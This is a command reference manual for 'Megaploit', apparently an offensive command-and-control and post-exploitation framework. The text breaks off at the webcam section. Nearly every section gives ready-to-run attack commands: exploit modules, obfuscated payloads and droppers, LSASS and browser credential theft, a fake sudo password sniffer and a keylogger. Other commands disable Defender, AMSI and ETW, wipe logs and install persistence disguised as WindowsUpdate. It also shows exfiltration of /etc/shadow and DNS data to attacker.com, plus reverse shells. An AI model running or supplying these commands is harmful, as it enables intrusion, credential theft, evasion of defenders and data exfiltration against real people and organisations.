# Megaploit CLI Reference

Complete reference for every command available in Megaploit, with examples for every option.

> **Tip:** Press `Tab` at any point for auto-completion. Use ↑/↓ to navigate history.

---

## Two Contexts

Megaploit has two separate prompt contexts:

| Context | What it looks like | What it's for |
|---|---|---|
| **Global** | `v4  megaploit [1] »` | Manage sessions, modules, payloads, reports |
| **Session** | `v4  megaploit session(1) »` | Interact with a compromised machine |

The `[1]` badge on the global prompt shows how many active sessions you have.

---

## Global Context (`megaploit [N] »`)

These commands are available at the main prompt, before entering a session.

---

### Session Management

#### `sessions` — List active sessions

```
megaploit [0] » sessions
```

Shows a table with:
- Session ID
- IP address and port
- Uptime since connection
- Tag (custom label)
- OS name
- Active status indicator

#### `sessions -K` — Kill ALL sessions

```
megaploit [2] » sessions -K
[+] All 2 sessions terminated.
```

⚠️ This immediately terminates every agent connection.

#### `sessions -k <id>` — Kill one session

```
megaploit [2] » sessions -k 2
[+] Session #2 killed.
```

#### `sessions -u <id>` — Upgrade session

Loads Meterpreter-class extensions onto the agent:

```
megaploit [1] » sessions -u 1
[+] Session #1 upgraded — meterp extensions loaded.
```

#### `sessions -c <cmd>` — Run a command on ALL sessions

Unlike `broadcast` (raw shell), `-c` sends a C2 command to every session:

```
megaploit [3] » sessions -c whoami
[Session #1 — 10.0.0.10] jdoe
[Session #2 — 10.0.0.20] root
[Session #3 — 10.0.0.30] SYSTEM
```

#### `sessions -s <tag>` — Filter by tag

```
megaploit [5] » sessions -s dc
# Only shows sessions tagged "dc"
```

#### `use <id>` — Enter a session

```
megaploit [1] » use 1
```

Drops you into the interactive session console (see [Session Context](#session-context)).

#### `broadcast <cmd>` — Run shell command on all sessions

```
megaploit [3] » broadcast id
```

Sends a raw shell command to every connected agent simultaneously. For C2-level commands use `sessions -c`.

---

### Configuration

#### `set <option> <value>`

| Option | Example | Description |
|---|---|---|
| `lhost` | `set lhost 192.168.1.10` | Callback IP agents connect back to |
| `port` | `set port 4444` | Callback port |
| `cert` | `set cert /path/to/cert.pem` | TLS certificate PEM file |
| `key` | `set key /path/to/key.pem` | TLS private key PEM file |
| `auto_update` | `set auto_update on` | Enable auto-update (`on`/`off`) |

```
megaploit [0] » set lhost 10.0.0.1
[+] lhost  →  10.0.0.1

megaploit [0] » set port 443
[+] port  →  443

megaploit [0] » set auto_update on
[+] auto_update  →  on  (tools update automatically)
```

---

### TLS

Enable encrypted transport between operator and agents.

#### `tls auto` — Generate and enable TLS immediately

```
megaploit [0] » tls auto
[+] TLS auto-cert active  →  loot/tls/cert.pem
[*] SHA-256 fingerprint  a3f2b1c9...
```

Requires the `cryptography` pip package, or falls back to `openssl` on PATH.

#### `tls regen` — Force-regenerate the cert

```
megaploit [0] » tls regen
[+] New cert generated  →  loot/tls/cert.pem
```

Use this to rotate certificates during long engagements.

#### `tls status` — Show TLS configuration

```
megaploit [0] » tls status
[+] TLS auto  cert=loot/tls/cert.pem
[*] Fingerprint  a3f2b1c9...
```

#### Starting with TLS from the command line

```bash
python3 server.py -lh 10.0.0.1 -p 4444 --tls

# Bring your own certificate:
python3 server.py -lh 10.0.0.1 -p 4444 --cert cert.pem --key key.pem
```

---

### Agent Generation

#### `generate` — Patch agent.py with current LHOST/PORT

```
megaploit [0] » set lhost 192.168.1.10
megaploit [0] » set port 4444
megaploit [0] » generate
[+] agent.py patched with LHOST=192.168.1.10 PORT=4444
```

#### `generate --tls` — Enable TLS in the agent

```
megaploit [0] » generate --tls
[+] TLS cert ready  →  loot/tls/cert.pem
[+] agent.py patched with LHOST=192.168.1.10 PORT=4444 TLS=True
```

#### `generate -c` — Byte-compile agent.py

```
megaploit [0] » generate -c
[+] agent.py byte-compiled
```

#### `generate --redirector <host>` — Domain-fronting

Bake a different callback host into the agent (CDN edge, cloud front domain, etc.):

```
megaploit [0] » generate --redirector cdn.legitimate-site.com
[*] Domain-fronting: agent will call back to  cdn.legitimate-site.com
```

---

### Module System

The module system works like Metasploit — select a module, set options, run it.

#### `show modules` — List all modules

```
megaploit [0] » show modules

  NAME                                          TYPE       RANK
  ────────────────────────────────────────────────────────────
  exploits/windows/smb/ms17_010_eternalblue    exploit    600
  exploits/linux/http/log4shell_cve2021_44228  exploit    600
  auxiliary/scanner/tcp_port                   auxiliary  —
  ...
```

#### `show modules <query>` — Filter by keyword

```
megaploit [0] » show modules smb
megaploit [0] » show modules linux
megaploit [0] » show modules exploit
megaploit [0] » show modules scanner
```

#### `use <module/path>` — Select a module

```
megaploit [0] » use exploits/windows/smb/ms17_010_eternalblue
megaploit [0] » use auxiliary/scanner/tcp_port
megaploit [0] » use exploits/linux/http/log4shell_cve2021_44228
```

#### `setopt <OPTION> <value>` — Set a module option

```
megaploit [0] » setopt RHOSTS 10.0.0.0/24
megaploit [0] » setopt RPORT 8080
megaploit [0] » setopt LHOST 192.168.1.10
megaploit [0] » setopt THREADS 50
megaploit [0] » setopt VERBOSE true
```

#### `options` — Show current option values

```
megaploit [0] » options

  Option    Type     Value           Req  Description
  ─────────────────────────────────────────────────────────────
  RHOSTS    string   10.0.0.0/24     yes  Target IP or CIDR
  RPORT     integer  8080            no   Target port
  LHOST     address  192.168.1.10    yes  Callback IP
  THREADS   integer  100             no   Concurrent threads
```

#### `check` — Pre-check target without exploiting

```
megaploit [0] » check
[+] 10.0.0.50:8080 — JNDI injection point confirmed (HTTP 200)
```

#### `run` — Execute the module

```
megaploit [0] » run
[+] Payload sent to 1/1 host(s)
[+] CONFIRMED callback from: 10.0.0.50
```

#### `info` — Show module documentation

```
megaploit [0] » info
Name:        Log4Shell RCE
CVE:         CVE-2021-44228
Platform:    linux/windows/darwin
Rank:        600

Description:
  Exploits Log4j2 JNDI injection (Log4Shell). Sends a crafted HTTP
  request with a JNDI lookup in a header. When Log4j processes the
  header, it makes a DNS/LDAP lookup to the attacker's server, which
  delivers a payload that calls back to Megaploit.

References:
  https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
  https://logging.apache.org/log4j/2.x/security.html
```

#### `back` — Deselect module

```
megaploit [0] » back
[*] Cleared module: exploits/linux/http/log4shell_cve2021_44228
```

---

### Payload Builder

Build agent payloads in 14 formats. See [PAYLOAD_BUILDER.md](PAYLOAD_BUILDER.md) for full documentation.

```
megaploit [0] » payload <format> [options]
```

**Format quick reference:**

```
megaploit [0] » payload ps1 --out agent.ps1
megaploit [0] » payload exe --out agent.exe --upx
megaploit [0] » payload go_elf --out agent_linux
megaploit [0] » payload py --encoder comment_spam --encoder varname_rand --out obf.py
megaploit [0] » payload py_stealth --out stealth.py
megaploit [0] » payload oneliner_ps1
```

---

### Staged Delivery

Stage-0 dropper authenticates with HMAC-SHA256, downloads stage-1 in memory, executes — no disk write.

#### `stage0 generate` — Generate dropper

```
megaploit [0] » stage0 generate --out dropper.py
megaploit [0] » stage0 generate --minimal --out macro_dropper.py
megaploit [0] » stage0 generate --start --port 4445
# --start also launches the staging server in background
```

#### `stage0 status` / `stage0 stop`

```
megaploit [0] » stage0 status
[+] Staging server running on port 4445

megaploit [0] » stage0 stop
```

---

### Post-Exploitation Pipeline

Automatically run commands on every new session. See [PIPELINE.md](PIPELINE.md).

```
megaploit [0] » pipeline enable creds      # harvest creds automatically
megaploit [0] » pipeline enable full       # run everything
megaploit [0] » pipeline disable creds
megaploit [0] » pipeline status
megaploit [0] » pipeline list
megaploit [0] » pipeline reload            # reload AutoRunScript config
```

---

### Pivot Routes

Document and share your pivot topology.

```
megaploit [0] » route add 10.10.0.0/16 2      # traffic to 10.10.x.x goes through session 2
megaploit [0] » route add 172.16.0.0/12 1      # traffic to 172.16.x.x goes through session 1
megaploit [0] » route print                    # show all routes
megaploit [0] » route remove 10.10.0.0/16
megaploit [0] » route flush                    # remove all routes
```

Routes are consulted by post modules and toolbox tools when deciding how to reach internal hosts.

---

### Operations

#### Jobs

```
megaploit [0] » jobs list
  ID         NAME              STATUS     STARTED
  a1b2c3     find_suid_scan    running    2024-01-15 14:30:22
  d4e5f6     hashdump_bg       complete   2024-01-15 14:29:05

megaploit [0] » jobs kill a1b2c3
```

#### Credential Store

```
megaploit [0] » creds show
megaploit [0] » creds search admin
megaploit [0] » creds search 10.0.0.42
megaploit [0] » creds export creds.json
megaploit [0] » creds clear     # requires YES confirmation
```

#### Reporting

```
megaploit [0] » report html pentest_report.html
megaploit [0] » report json pentest_report.json
```

#### Loot Browser

```
megaploit [0] » loot browse
megaploit [0] » loot export /tmp/engagement_loot/
megaploit [0] » loot clear      # requires YES confirmation
```

---

### AutoRunScript

```
megaploit [0] » autorun show             # display current config
megaploit [0] » autorun reload           # reload from ~/.megaploit_autorun.json
megaploit [0] » autorun save-default     # write starter template
megaploit [0] » autorun test 1           # preview what would run for session 1
```

---

### Web Dashboard

```
megaploit [0] » web start                # start at http://127.0.0.1:8080
megaploit [0] » web start --port 9090   # custom port
megaploit [0] » web start --host 0.0.0.0 # bind to all interfaces
megaploit [0] » web stop
megaploit [0] » web status
```

---

### Multi-Operator RPC

```
megaploit [0] » rpc start                # start on 127.0.0.1:7777
megaploit [0] » rpc start --port 8888
megaploit [0] » rpc operators            # list connected operators
megaploit [0] » rpc stop
megaploit [0] » rpc status
```

---

### Toolbox

Install and manage external security tools. Full reference in [Networking docs](NETWORKING.md).

```
megaploit [0] » toolbox install https://github.com/carlospolop/PEASS-ng linpeas
megaploit [0] » toolbox catalogue                    # browse 200+ tools
megaploit [0] » toolbox catalogue install nmap
megaploit [0] » toolbox list
megaploit [0] » toolbox search "privilege escalation"
megaploit [0] » toolbox info linpeas
megaploit [0] » toolbox update linpeas
megaploit [0] » toolbox update-all
megaploit [0] » toolbox rebuild linpeas
megaploit [0] » toolbox remove linpeas
megaploit [0] » toolbox healthcheck                  # check all tools
megaploit [0] » toolbox healthcheck nmap             # check one tool
megaploit [0] » toolbox audit linpeas
megaploit [0] » toolbox plan linpeas                 # dry-run install
megaploit [0] » toolbox dockerfile linpeas           # generate Dockerfile
megaploit [0] » toolbox workspace list
megaploit [0] » toolbox workspace new redteam
megaploit [0] » toolbox workspace install-all redteam
megaploit [0] » toolbox workspace export redteam
```

---

### Plugins

```
megaploit [0] » plugins                  # list loaded plugins
megaploit [0] » plugins reload           # re-scan plugins/
megaploit [0] » plugins info c_remote_shell
megaploit [0] » plugins enable c_remote_shell
megaploit [0] » plugins disable c_remote_shell
megaploit [0] » plugins load /path/to/my_plugin.toml
megaploit [0] » plugins watcher on       # auto-reload on file changes
megaploit [0] » plugins watcher off
megaploit [0] » plugins deps install     # pip-install missing deps
```

#### C-remote-shell Plugin

Compiles and manages the hardened Windows C agent:

```
megaploit [0] » crs_build              # compile megaploit_c_agent.exe
megaploit [0] » crs_build 10.0.0.1 4444  # override LHOST/PORT
megaploit [0] » crs_probe              # 46-signal C2 compliance report
megaploit [0] » crs_verbs              # list all wire verbs
megaploit [0] » crs_payload_info       # show MinGW build command

# In a C-remote-shell session:
megaploit session(1) » forceOff        # ⚠ force power-off
megaploit session(1) » blueScreen      # ⚠ trigger BSOD
```

---

### Engagement & Operations

```
megaploit [0] » engagement name "Corp Network Assessment"
megaploit [0] » engagement desc "Internal red team engagement — Q1 2024"
megaploit [0] » engagement show

megaploit [0] » alias sys sysinfo       # create shortcut
megaploit [0] » alias enum "ps; users; installed_software"
megaploit [0] » unalias sys
megaploit [0] » aliases                 # list all

megaploit [0] » history                 # last 20 commands
megaploit [0] » history 50
megaploit [0] » history search hashdump
megaploit [0] » history clear

megaploit [0] » env_probe               # check operator toolchain
megaploit [0] » workspace list
megaploit [0] » workspace new phase2
megaploit [0] » workspace switch phase2

megaploit [0] » listener add 8080            # extra listener on port 8080
megaploit [0] » listener add 443 --tls       # extra TLS listener
megaploit [0] » listener add 80 --http       # HTTP/WebSocket listener
megaploit [0] » listener add 53 --dns --zone attacker.com  # DNS listener
megaploit [0] » listener rm 8080
megaploit [0] » listener list

megaploit [0] » resource /path/to/script.rc  # run a batch command file
megaploit [0] » whats new                    # show v4.1 changelog
megaploit [0] » clear                        # clear terminal
megaploit [0] » exit                         # shut down Megaploit
```

---

## Session Context (`megaploit session(N) »`)

Enter with `use <id>`. Return with `back` or Ctrl-C. Kill agent with `exit`.

---

### Core / Navigation

| Command | Example | What it does |
|---|---|---|
| `help` | `help` | Show all commands with descriptions |
| `sysinfo` | `sysinfo` | OS, hostname, username, CPU%, RAM, disk, Python version |
| `whoami` | `whoami` | Current user + Administrator/root status |
| `getpid` | `getpid` | The agent's own process ID |
| `getuid` | `getuid` | UID / domain\\user details |
| `cd <dir>` | `cd /tmp` | Change working directory on the target |
| `background` | `background` | Return to global prompt (session stays alive) |
| `back` | `back` | Same as background |
| `sleep <secs>` | `sleep 60` | Operator-controlled agent sleep |
| `beacon_sleep <secs>` | `beacon_sleep 30` | Adjust reconnect interval |
| `exit` | `exit` | Kill the agent and close the session |

---

### File System

#### `ls [path]` — List directory

```
megaploit session(1) » ls
megaploit session(1) » ls /home
megaploit session(1) » ls C:\Users
megaploit session(1) » ls /etc
```

#### `cat <file>` — Read file contents

```
megaploit session(1) » cat /etc/passwd
megaploit session(1) » cat /etc/hosts
megaploit session(1) » cat C:\Windows\System32\drivers\etc\hosts
```

#### `tail <file> [n]` — Last N lines

```
megaploit session(1) » tail /var/log/auth.log
megaploit session(1) » tail /var/log/syslog 50
megaploit session(1) » tail C:\Windows\System32\winevt\Logs\System.evtx 100
```

#### `find_files <path> <pattern>` — Recursive file search

```
megaploit session(1) » find_files /home *.key
megaploit session(1) » find_files / *.pem
megaploit session(1) » find_files C:\Users *.kdbx        # KeePass databases
megaploit session(1) » find_files /var/www config.php    # web app configs
megaploit session(1) » find_files C:\Users *.rdp         # saved RDP connections
```

#### `find_writable <path>` — Find world-writable files and dirs

```
megaploit session(1) » find_writable /var/www
megaploit session(1) » find_writable /tmp
megaploit session(1) » find_writable C:\Program Files
```

#### `find_suid` — Find SUID/SGID binaries (Linux privesc)

```
megaploit session(1) » find_suid
# Outputs binaries like:
# /usr/bin/pkexec  (CVE-2021-4034 PwnKit)
# /usr/bin/sudo
# /usr/bin/python3  (if misconfigured)
```

#### `file_hash <file>` — SHA-256 hash

```
megaploit session(1) » file_hash /etc/shadow
megaploit session(1) » file_hash C:\Windows\System32\lsass.exe
```

#### `search <path> <keyword>` — Recursive grep

```
megaploit session(1) » search /etc password
megaploit session(1) » search /home api_key
megaploit session(1) » search /var/www db_password
megaploit session(1) » search C:\Users password
megaploit session(1) » search / "BEGIN RSA PRIVATE KEY"
```

#### `write_file <path> <content>` — Write text to a file

```
megaploit session(1) » write_file /tmp/test.sh "#!/bin/bash\nid"
megaploit session(1) » write_file C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.vbs "Set ws = CreateObject(\"WScript.Shell\")\nws.Run \"agent.exe\", 0"
```

#### `mkdir <path>`

```
megaploit session(1) » mkdir /tmp/.hidden
megaploit session(1) » mkdir C:\Users\user\AppData\Roaming\WindowsHelper
```

#### `rm <path>` — Delete file or directory

```
megaploit session(1) » rm /tmp/exploit.py
megaploit session(1) » rm C:\Temp\tools
```

#### `chmod <mode> <path>` — Change permissions (Unix)

```
megaploit session(1) » chmod 755 /tmp/exploit.sh
megaploit session(1) » chmod 600 /tmp/secret.key
```

---

### File Transfer

#### `upload <local_file>` — Push file to target

```
megaploit session(1) » upload /tools/linpeas.sh
  [████████████████████] 100.0%  825 KB / 825 KB   3 MB/s
[+] Uploaded 'linpeas.sh'  (825 KB  in 0.3s  @ 3 MB/s)
```

#### `download <remote_file>` — Pull file from target

```
megaploit session(1) » download /etc/shadow
  [████████████████████] 100.0%  1 KB / 1 KB   512 KB/s
[+] Saved to: loot/session_1_10.0.0.42/shadow

megaploit session(1) » download C:\Users\jdoe\Documents\passwords.xlsx
megaploit session(1) » download /home/user/.ssh/id_rsa
```

Downloaded files are saved to `loot/session_<N>_<IP>/`.

#### `zip_download <path>` — Download a whole directory

```
megaploit session(1) » zip_download /home/user/.ssh
[+] Archive saved: loot/session_1.../_.ssh.zip

megaploit session(1) » zip_download /var/www/html
megaploit session(1) » zip_download C:\Users\jdoe\Desktop
```

#### `zip_upload <local_dir> <remote_name>` — Upload a directory

```
megaploit session(1) » zip_upload /local/tools toolkit.zip
```

#### `verify <local_file> <remote_file>` — Confirm transfer integrity

Compares SHA-256 hashes on both sides:

```
megaploit session(1) » verify /local/agent.exe C:\Temp\agent.exe
[+] SHA-256 match — transfer integrity confirmed.
```

---

### Process & System Intelligence

#### `ps [filter]` — Process list

```
megaploit session(1) » ps
megaploit session(1) » ps chrome          # filter by name
megaploit session(1) » ps 1234            # filter by PID
```

#### `kill <pid>` — Kill a process

```
megaploit session(1) » kill 1234
megaploit session(1) » kill 8832          # kill a security tool or AV
```

#### `netstat` — Active connections

```
megaploit session(1) » netstat
# Shows: PID  Proto  LocalAddr  ForeignAddr  State
```

#### `arp` — ARP cache

```
megaploit session(1) » arp
# Shows: IP → MAC → Interface
# Use this to discover other hosts on the LAN
```

#### `routes` — IP routing table

```
megaploit session(1) » routes
```

#### `ifconfig` — Network interfaces

```
megaploit session(1) » ifconfig
# All interfaces with IPs, MACs, and netmasks
```

#### `env [filter]` — Environment variables

```
megaploit session(1) » env
megaploit session(1) » env PATH
megaploit session(1) » env AWS          # find cloud credentials
```

#### `installed_software` — Installed programs

```
megaploit session(1) » installed_software
# Windows: reads registry Uninstall keys
# Linux: dpkg -l / rpm -qa / pacman -Q
```

#### `active_windows` — Window titles

```
megaploit session(1) » active_windows
# E.g.: "Chrome - Gmail", "KeePass 2 - Database"
# Tells you what the user is working on
```

#### `scheduled_tasks` — Cron / Task Scheduler

```
megaploit session(1) » scheduled_tasks
# Useful for: persistence discovery, privesc via writable task paths
```

#### `services [filter]` — Running services

```
megaploit session(1) » services
megaploit session(1) » services sql
megaploit session(1) » services defender
```

#### `users` — User accounts

```
megaploit session(1) » users
# Lists local users with group memberships
```

#### `logged_in` — Currently logged-in users

```
megaploit session(1) » logged_in
```

#### `startup_items` — Autostart entries

```
megaploit session(1) » startup_items
# Shows: registry Run keys, startup folders, LaunchDaemons, systemd units
```

#### `os_info` — Detailed OS fingerprint

```
megaploit session(1) » os_info
# Build number, patch level, install date, uptime, architecture
```

#### `dns_query <hostname>` — DNS lookup from target

```
megaploit session(1) » dns_query internal-dc.corp
megaploit session(1) » dns_query fileserver.local
# Resolves using the target's DNS server — finds internal hostnames
```

#### `idle_time` — Seconds since last user input

```
megaploit session(1) » idle_time
[+] User idle for 847 seconds
# If > 300, user probably stepped away — safe to operate
```

---

### Credential Harvesting

#### `hashdump` — Password hash dump

```
megaploit session(1) » hashdump
# Linux: reads /etc/shadow (needs root)
# Windows: saves SAM+SYSTEM hive (needs SYSTEM)
# Output auto-saved to credential store
```

> **Tip:** Run `getsystem` first on Windows to get SYSTEM privileges.

#### `wifi_passwords` — Saved Wi-Fi passwords

```
megaploit session(1) » wifi_passwords
# Works on Windows (netsh), Linux (NetworkManager), macOS (security)
```

#### `browser_creds [passwords|cookies|all]` — Browser credentials

```
megaploit session(1) » browser_creds
megaploit session(1) » browser_creds passwords    # saved passwords only
megaploit session(1) » browser_creds cookies      # session cookies only
megaploit session(1) » browser_creds all          # both
# Works on: Chrome, Edge, Brave, Opera, Firefox
```

#### `browser_history [count]` — Browser history

```
megaploit session(1) » browser_history
megaploit session(1) » browser_history 500
```

#### `cred_vault` — Windows Credential Manager

```
megaploit session(1) » cred_vault
# Dumps: saved RDP passwords, Windows generic credentials, VPN credentials
# No elevation needed — current user's vault
```

#### `ssh_harvest` — SSH keys and history

```
megaploit session(1) » ssh_harvest
# Collects: ~/.ssh/id_* private keys, ~/.ssh/known_hosts, SSH commands from shell history
```

#### `sudo_sniff [log_path]` — Fake sudo password capture (Linux)

```
megaploit session(1) » sudo_sniff
# Plants a fake /usr/local/bin/sudo that captures the next password
# Default log: /tmp/.ssniff

megaploit session(1) » sudo_sniff_read      # read captured passwords
megaploit session(1) » sudo_sniff_clean     # remove fake sudo + log
```

#### `whoami_priv` — Token privileges

```
megaploit session(1) » whoami_priv
# Shows all privileges and which are enabled
# Look for: SeDebugPrivilege, SeImpersonatePrivilege, SeTakeOwnershipPrivilege
```

---

### Kiwi — Windows Credential Dumper

Kiwi is a compiled C binary (`megaploit_kiwi.exe`) that extracts credentials from a Windows target. It compiles automatically on first use (requires MinGW-w64 `gcc` or MSVC `cl.exe`).

> **Always run `getsystem` first for the most powerful operations.**

#### `kiwi logonpasswords` — LSASS dump

```
megaploit session(1) » kiwi logonpasswords
# Uses ReadProcessMemory on lsass.exe
# Extracts: NTLM hashes, SHA1 hashes for all logged-on users
# Requires: SYSTEM or SeDebugPrivilege
```

#### `kiwi sam` — SAM hive dump

```
megaploit session(1) » kiwi sam
# Uses RegSaveKey to dump SAM + SYSTEM hive
# Extracts: local account NTLM hashes
# Requires: backup privilege or SYSTEM
```

#### `kiwi lsa` — LSA secrets

```
megaploit session(1) » kiwi lsa
# Reads SECURITY\Policy\Secrets
# Extracts: service account passwords, domain cached credentials
# Requires: SYSTEM
```

#### `kiwi credman` — Credential Manager

```
megaploit session(1) » kiwi credman
# Uses CredEnumerateW — no elevation needed
# Extracts: saved RDP creds, generic Windows credentials
```

#### `kiwi tickets` — Kerberos tickets

```
megaploit session(1) » kiwi tickets
# Lists TGT/TGS from the Kerberos cache
# Useful for pass-the-ticket attacks
```

#### `kiwi wdigest` — Re-enable WDigest cleartext

```
megaploit session(1) » kiwi wdigest
# Sets HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential = 1
# Next logon will cache cleartext credentials in memory
# Then use kiwi logonpasswords after user logs in again
```

#### `kiwi dpapi` — DPAPI masterkey GUIDs

```
megaploit session(1) » kiwi dpapi
# Enumerates DPAPI masterkey GUIDs for all user profiles
# Used to decrypt DPAPI-protected data (browser credentials, certificates)
```

#### `kiwi all` — Run all modules

```
megaploit session(1) » kiwi all
```

---

### Privilege Escalation

#### `getsystem` — SYSTEM via 3-technique cascade

```
megaploit session(1) » getsystem
[*] Trying named-pipe impersonation (schtasks SYSTEM lure)...
[+] Technique 1 succeeded — running as SYSTEM
```

Tries in order:
1. Named-pipe impersonation — creates a scheduled task that runs as SYSTEM and connects to a named pipe; calls `ImpersonateNamedPipeClient`
2. SeDebugPrivilege token steal — opens a SYSTEM process, duplicates its token, calls `ImpersonateLoggedOnUser`
3. Unquoted service path — discovers services with unquoted paths and writable directories

#### `uac_bypass <command>` — Bypass UAC (Windows 10/11)

```
megaploit session(1) » uac_bypass cmd.exe
megaploit session(1) » uac_bypass "powershell -ep bypass -c whoami"
megaploit session(1) » uac_bypass "net localgroup administrators backdoor /add"
```

Uses fodhelper.exe registry hijack — no UAC prompt, no admin password.

#### `token_steal [pid]` — Steal a process token

```
megaploit session(1) » token_steal
megaploit session(1) » token_steal 4          # steal from PID 4 (System process)
megaploit session(1) » token_steal 624        # steal from specific PID
```

Requires admin. Opens the process, duplicates its access token, impersonates it.

#### `make_token <user> <pass>` — Impersonate user without credentials

```
megaploit session(1) » make_token DOMAIN\admin P@ssw0rd
megaploit session(1) » make_token .\localadmin P@ssword123
```

#### `rev2self` — Revert impersonation

```
megaploit session(1) » rev2self
```

#### `run_as <user> <pass> <cmd>` — Execute as different user

```
megaploit session(1) » run_as DOMAIN\admin P@ssw0rd whoami
megaploit session(1) » run_as .\localadmin Password123 "net user /domain"
megaploit session(1) » run_as root rootpassword id
# Windows: uses CreateProcessWithLogonW
# Unix: uses sudo -u or su -c
```

#### `whoami_priv` — Show exploitable privileges

```
megaploit session(1) » whoami_priv
# SeImpersonatePrivilege → can use potato attacks
# SeDebugPrivilege → can read LSASS
# SeTakeOwnershipPrivilege → can own any file
```

---

### Evasion & Anti-Forensics

#### `patch_amsi` — Disable AMSI

```
megaploit session(1) » patch_amsi
[+] AMSI patched — AmsiScanBuffer → RET stub
```

Byte-patches `AmsiScanBuffer` in the current process to always return `AMSI_RESULT_CLEAN`.

#### `disable_defender` — Disable Windows Defender

```
megaploit session(1) » disable_defender
[+] Windows Defender disabled
```

#### `etw_patch` — Disable ETW telemetry

```
megaploit session(1) » etw_patch
[+] ETW patched — EtwEventWrite → 0xC3 RET stub
```

Patches `EtwEventWrite` in ntdll.dll for the current process, disabling all ETW-based telemetry.

#### `sandbox_check` — Detect analysis environment

```
megaploit session(1) » sandbox_check
CPU count:   1  (suspicious — real machines usually have 2+)
Disk size:   40 GB  (suspicious — sandboxes often have small disks)
Uptime:      180s  (suspicious — sandboxes often have short uptime)
Hostname:    DESKTOP-SANDBOX  (suspicious pattern)
Debugger:    not detected
Mouse delta: 0px in last 5s  (suspicious — no user activity)
```

#### `hide_file <path>` — Set hidden attribute

```
megaploit session(1) » hide_file C:\Users\user\AppData\agent.py
```

#### `timestomp <file> <reference>` — Copy timestamps

```
megaploit session(1) » timestomp C:\evil.exe C:\Windows\System32\notepad.exe
# evil.exe now has notepad.exe's timestamps — hides from timeline forensics
```

#### `clear_logs` — Wipe event logs

```
megaploit session(1) » clear_logs
# Windows: clears System, Security, Application event logs via wevtutil
# Linux: truncates /var/log/syslog, /var/log/auth.log, /var/log/messages
```

#### `lock_screen` — Lock the workstation

```
megaploit session(1) » lock_screen
# Locks the screen while you operate — victim can't see activity
```

#### `self_destruct` — Remove all traces and exit

```
megaploit session(1) » self_destruct
# Removes: persistence registry keys, agent EXE, keylog file
# Then kills the agent process
```

---

### Persistence

#### `persist <regname> <filename>` — Windows Run key

```
megaploit session(1) » persist WindowsUpdate agent.py
# Copies agent.py to %APPDATA%\agent.py
# Adds registry key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate

megaploit session(1) » persist MicrosoftEdgeUpdate updater.exe
```

#### `startup_items` — View existing autostart entries

```
megaploit session(1) » startup_items
# Shows what's already installed (other malware, legitimate software, etc.)
```

---

### Keylogger

```
# Start capturing
megaploit session(1) » keylog_start
[+] Keylogger started.

# Read captured keystrokes
megaploit session(1) » keylog_dump
[2024-01-15 14:35:22] Password: P@ssw0rd123
[2024-01-15 14:36:01] Subject: Re: VP login credentials

# Stop and clean up
megaploit session(1) » keylog_stop
[+] Keylogger stopped. Log deleted from target.
```

---

### Network & Pivoting

See [NETWORKING.md](NETWORKING.md) for detailed pivoting guides.

#### `portfwd <lport> <rhost> <rport>` — TCP relay

```
megaploit session(1) » portfwd 8888 10.10.10.20 3389
# Traffic to target-ip:8888 is forwarded to 10.10.10.20:3389
# Connect with: mstsc /v:target-ip:8888

megaploit session(1) » portfwd 2222 10.10.10.100 22
# SSH tunnel: ssh user@target-ip -p 2222
```

#### `socks5 [port]` — SOCKS5 proxy on the target

```
megaploit session(1) » socks5
[+] SOCKS5 proxy started on target:1080

megaploit session(1) » socks5 9050
# Configure proxychains: socks5 target-ip 1080
# Then: proxychains nmap 10.10.10.0/24
```

#### `ping_sweep <cidr>` — ICMP sweep

```
megaploit session(1) » ping_sweep 10.10.10.0/24
```

#### `arp_scan <cidr>` — ARP scan (finds hosts even without ICMP)

```
megaploit session(1) » arp_scan 10.10.10.0/24
[+] 10.10.10.1   00:1A:2B:3C:4D:5E  (gateway)
[+] 10.10.10.10  00:50:56:AB:CD:EF  (VMware)
[+] 10.10.10.20  00:0C:29:12:34:56  (VMware)
```

#### `port_scan <host> <ports>` — TCP scan from target

```
megaploit session(1) » port_scan 10.10.10.20 22,80,443,3389
megaploit session(1) » port_scan 10.10.10.20 1-1024
megaploit session(1) » port_scan 10.10.10.20 8080-8090
# 256 concurrent threads — fast scan
```

#### `net_view [domain]` — Domain enumeration

```
megaploit session(1) » net_view
megaploit session(1) » net_view CORPORATE.LOCAL
# Lists: domain computers, domain controllers, shared folders
```

#### `smb_shares <host>` — SMB share enumeration

```
megaploit session(1) » smb_shares 10.10.10.10
megaploit session(1) » smb_shares FILESERVER01
```

#### `ssh_connect <host> <port> <user> <pass>` — SSH pivot

```
megaploit session(1) » ssh_connect 10.10.10.50 22 root P@ssword!
```

#### `rdp_enable` — Enable Remote Desktop

```
megaploit session(1) » rdp_enable
[+] RDP enabled — connect with: mstsc /v:10.0.0.42
```

#### `dns_query <hostname>` — DNS lookup from target's resolver

```
megaploit session(1) » dns_query internal-dc.corp
megaploit session(1) » dns_query fileserver.local
```

#### `exfil_dns <data> <domain>` — DNS exfiltration

```
megaploit session(1) » exfil_dns "secret_data" attacker.com
# Data encoded into DNS queries — bypasses HTTP firewalls
```

#### `exfil_http <url> <file>` — HTTP exfiltration

```
megaploit session(1) » exfil_http http://attacker.com/upload /etc/shadow
```

#### `reverse_shell <ip> <port>` — Separate PTY reverse shell

```
megaploit session(1) » reverse_shell 192.168.1.10 5555
# Opens an independent reverse shell — different from C2 channel
# Start a listener first: nc -lvnp 5555
```

---

### Screen & Media Capture

#### `screenshot` — Single screenshot

```
megaploit session(1) » screenshot
[+] Screenshot saved: loot/session_1_10.0.0.42/screenshots/20240115_143022.png
# PNG with embedded metadata (IP, timestamp, session ID)
```

#### `screenshot_region <x> <y> <w> <h>` — Region capture

```
megaploit session(1) » screenshot_region 0 0 1920 1080
megaploit session(1) » screenshot_region 0 0 800 600
```

#### `screenshot_timelapse <count> <interval>` — Multiple frames

```
megaploit session(1) » screenshot_timelapse 10 30
# Takes 10 screenshots, 30 seconds apart
# Saves as timelapse.zip in loot
```

#### `stream <n> [fps]` — Live frame burst (Meterp session)

```
megaploit (10.0.0.42) > stream 30 10
  30/30 frames received
[+] 30 frames saved to loot/session_1_10.0.0.42/stream/
```

#### `screen_stream <on|off>` — MJPEG stream

```
megaploit session(1) » screen_stream on
[+] Screen stream started — http://10.0.0.42:5000
megaploit session(1) » screen_stream off
```

#### `webcam <on|off>` — Webcam stream

```
